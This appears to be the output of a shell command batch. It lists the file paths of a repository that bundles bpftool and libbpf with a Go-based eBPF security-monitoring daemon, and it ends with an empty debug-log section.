+./bpftool/include/uapi/asm-generic/bitsperlong.h
+./bpftool/include/uapi/linux/bpf.h
+./bpftool/include/uapi/linux/bpf_common.h
+./bpftool/include/uapi/linux/btf.h
+./bpftool/include/uapi/linux/const.h
+./bpftool/include/uapi/linux/if_link.h
+./bpftool/include/uapi/linux/netlink.h
+./bpftool/include/uapi/linux/perf_event.h
+./bpftool/include/uapi/linux/pkt_cls.h
+./bpftool/include/uapi/linux/pkt_sched.h
+./bpftool/include/uapi/linux/tc_act/tc_bpf.h
+./bpftool/libbpf/.github/actions/build-selftests/vmlinux.h
+./bpftool/libbpf/.readthedocs.yaml
+./bpftool/libbpf/ci/build-in-docker.sh
+./bpftool/libbpf/ci/managers/debian.sh
+./bpftool/libbpf/ci/managers/test_compile.sh
+./bpftool/libbpf/ci/managers/ubuntu.sh
+./bpftool/libbpf/fuzz/bpf-object-fuzzer.c
+./bpftool/libbpf/include/asm/barrier.h
+./bpftool/libbpf/include/linux/compiler.h
+./bpftool/libbpf/include/linux/err.h
+./bpftool/libbpf/include/linux/filter.h
+./bpftool/libbpf/include/linux/kernel.h
+./bpftool/libbpf/include/linux/list.h
+./bpftool/libbpf/include/linux/overflow.h
+./bpftool/libbpf/include/linux/ring_buffer.h
+./bpftool/libbpf/include/linux/types.h
+./bpftool/libbpf/include/uapi/linux/bpf.h
+./bpftool/libbpf/include/uapi/linux/bpf_common.h
+./bpftool/libbpf/include/uapi/linux/btf.h
+./bpftool/libbpf/include/uapi/linux/fcntl.h
+./bpftool/libbpf/include/uapi/linux/if_link.h
+./bpftool/libbpf/include/uapi/linux/if_xdp.h
+./bpftool/libbpf/include/uapi/linux/netdev.h
+./bpftool/libbpf/include/uapi/linux/netlink.h
+./bpftool/libbpf/include/uapi/linux/openat2.h
+./bpftool/libbpf/include/uapi/linux/perf_event.h
+./bpftool/libbpf/include/uapi/linux/pkt_cls.h
+./bpftool/libbpf/include/uapi/linux/pkt_sched.h
+./bpftool/libbpf/include/uapi/linux/stddef.h
+./bpftool/libbpf/scripts/build-fuzzers.sh
+./bpftool/libbpf/scripts/coverity.sh
+./bpftool/libbpf/scripts/mailmap-update.sh
+./bpftool/libbpf/scripts/sync-kernel.sh
+./bpftool/libbpf/src/bpf.c
+./bpftool/libbpf/src/bpf.h
+./bpftool/libbpf/src/bpf_core_read.h
+./bpftool/libbpf/src/bpf_endian.h
+./bpftool/libbpf/src/bpf_gen_internal.h
+./bpftool/libbpf/src/bpf_helper_defs.h
+./bpftool/libbpf/src/bpf_helpers.h
+./bpftool/libbpf/src/bpf_prog_linfo.c
+./bpftool/libbpf/src/bpf_tracing.h
+./bpftool/libbpf/src/btf.c
+./bpftool/libbpf/src/btf.h
+./bpftool/libbpf/src/btf_dump.c
+./bpftool/libbpf/src/btf_iter.c
+./bpftool/libbpf/src/btf_relocate.c
+./bpftool/libbpf/src/elf.c
+./bpftool/libbpf/src/features.c
+./bpftool/libbpf/src/gen_loader.c
+./bpftool/libbpf/src/hashmap.c
+./bpftool/libbpf/src/hashmap.h
+./bpftool/libbpf/src/libbpf.c
+./bpftool/libbpf/src/libbpf.h
+./bpftool/libbpf/src/libbpf_common.h
+./bpftool/libbpf/src/libbpf_internal.h
+./bpftool/libbpf/src/libbpf_legacy.h
+./bpftool/libbpf/src/libbpf_probes.c
+./bpftool/libbpf/src/libbpf_utils.c
+./bpftool/libbpf/src/libbpf_version.h
+./bpftool/libbpf/src/linker.c
+./bpftool/libbpf/src/netlink.c
+./bpftool/libbpf/src/nlattr.c
+./bpftool/libbpf/src/nlattr.h
+./bpftool/libbpf/src/relo_core.c
+./bpftool/libbpf/src/relo_core.h
+./bpftool/libbpf/src/ringbuf.c
+./bpftool/libbpf/src/skel_internal.h
+./bpftool/libbpf/src/strset.c
+./bpftool/libbpf/src/strset.h
+./bpftool/libbpf/src/usdt.bpf.h
+./bpftool/libbpf/src/usdt.c
+./bpftool/libbpf/src/zip.c
+./bpftool/libbpf/src/zip.h
+./bpftool/scripts/gh-label-release-assets.sh
+./bpftool/scripts/mailmap-update.sh
+./bpftool/scripts/sync-kernel.sh
+./bpftool/src/bootstrap/libbpf/include/bpf/bpf.h
+./bpftool/src/bootstrap/libbpf/include/bpf/bpf_core_read.h
+./bpftool/src/bootstrap/libbpf/include/bpf/bpf_endian.h
+./bpftool/src/bootstrap/libbpf/include/bpf/bpf_helper_defs.h
+./bpftool/src/bootstrap/libbpf/include/bpf/bpf_helpers.h
+./bpftool/src/bootstrap/libbpf/include/bpf/bpf_tracing.h
+./bpftool/src/bootstrap/libbpf/include/bpf/btf.h
+./bpftool/src/bootstrap/libbpf/include/bpf/hashmap.h
+./bpftool/src/bootstrap/libbpf/include/bpf/libbpf.h
+./bpftool/src/bootstrap/libbpf/include/bpf/libbpf_common.h
+./bpftool/src/bootstrap/libbpf/include/bpf/libbpf_internal.h
+./bpftool/src/bootstrap/libbpf/include/bpf/libbpf_legacy.h
+./bpftool/src/bootstrap/libbpf/include/bpf/libbpf_version.h
+./bpftool/src/bootstrap/libbpf/include/bpf/relo_core.h
+./bpftool/src/bootstrap/libbpf/include/bpf/skel_internal.h
+./bpftool/src/bootstrap/libbpf/include/bpf/usdt.bpf.h
+./bpftool/src/btf.c
+./bpftool/src/btf_dumper.c
+./bpftool/src/cfg.c
+./bpftool/src/cfg.h
+./bpftool/src/cgroup.c
+./bpftool/src/common.c
+./bpftool/src/feature.c
+./bpftool/src/gen.c
+./bpftool/src/iter.c
+./bpftool/src/jit_disasm.c
+./bpftool/src/json_writer.c
+./bpftool/src/json_writer.h
+./bpftool/src/kernel/bpf/disasm.c
+./bpftool/src/kernel/bpf/disasm.h
+./bpftool/src/libbpf/include/bpf/bpf.h
+./bpftool/src/libbpf/include/bpf/bpf_core_read.h
+./bpftool/src/libbpf/include/bpf/bpf_endian.h
+./bpftool/src/libbpf/include/bpf/bpf_helper_defs.h
+./bpftool/src/libbpf/include/bpf/bpf_helpers.h
+./bpftool/src/libbpf/include/bpf/bpf_tracing.h
+./bpftool/src/libbpf/include/bpf/btf.h
+./bpftool/src/libbpf/include/bpf/hashmap.h
+./bpftool/src/libbpf/include/bpf/libbpf.h
+./bpftool/src/libbpf/include/bpf/libbpf_common.h
+./bpftool/src/libbpf/include/bpf/libbpf_internal.h
+./bpftool/src/libbpf/include/bpf/libbpf_legacy.h
+./bpftool/src/libbpf/include/bpf/libbpf_version.h
+./bpftool/src/libbpf/include/bpf/nlattr.h
+./bpftool/src/libbpf/include/bpf/relo_core.h
+./bpftool/src/libbpf/include/bpf/skel_internal.h
+./bpftool/src/libbpf/include/bpf/usdt.bpf.h
+./bpftool/src/link.c
+./bpftool/src/main.c
+./bpftool/src/main.h
+./bpftool/src/map.c
+./bpftool/src/map_perf_ring.c
+./bpftool/src/net.c
+./bpftool/src/netlink_dumper.c
+./bpftool/src/netlink_dumper.h
+./bpftool/src/perf.c
+./bpftool/src/pid_iter.skel.h
+./bpftool/src/pids.c
+./bpftool/src/profiler.skel.h
+./bpftool/src/prog.c
+./bpftool/src/sign.c
+./bpftool/src/skeleton/pid_iter.bpf.c
+./bpftool/src/skeleton/pid_iter.h
+./bpftool/src/skeleton/profiler.bpf.c
+./bpftool/src/struct_ops.c
+./bpftool/src/token.c
+./bpftool/src/tracelog.c
+./bpftool/src/vmlinux.h
+./bpftool/src/xlated_dumper.c
+./bpftool/src/xlated_dumper.h
+./cmd/rsbpd/main.go
+./config/rsbp.yaml
+./internal/alert/alert.go
+./internal/alert/emitter.go
+./internal/api/server.go
+./internal/correlation/engine.go
+./internal/correlation/engine_test.go
+./internal/correlation/patterns.go
+./internal/correlation/session.go
+./internal/correlation/session_test.go
+./internal/detection/baseline.go
+./internal/detection/engine.go
+./internal/detection/engine_test.go
+./internal/detection/mitre.go
+./internal/detection/rules.go
+./internal/detection/rules_test.go
+./internal/detection/whitelist.go
+./internal/ebpf/bpf_bpfeb.go
+./internal/ebpf/bpf_bpfel.go
+./internal/ebpf/generate.go
+./internal/ebpf/loader.go
+./internal/enrichment/cmdline_parser.go
+./internal/enrichment/enricher.go
+./internal/enrichment/geoip.go
+./internal/enrichment/proc.go
+./internal/enrichment/reputation.go
+./internal/forensics/collector.go
+./internal/output/elasticsearch.go
+./internal/output/jsonl.go
+./internal/output/kafka.go
+./internal/output/sink.go
+./internal/output/splunk.go
+./internal/output/syslog_unix.go
+./internal/output/syslog_windows.go
+./internal/output/webhook.go
+./internal/types/types.go
+./llvm.sh
+./scripts/install_deps.sh
+./test/integration/harness.go
+./test/integration/scenarios_test.go
+./test/simulate/attack_sim.sh
+
+===== STEP 5: LATEST DEBUG LOG (tail -200) =====
+No log
+
+===== COMMAND BATCH END =====
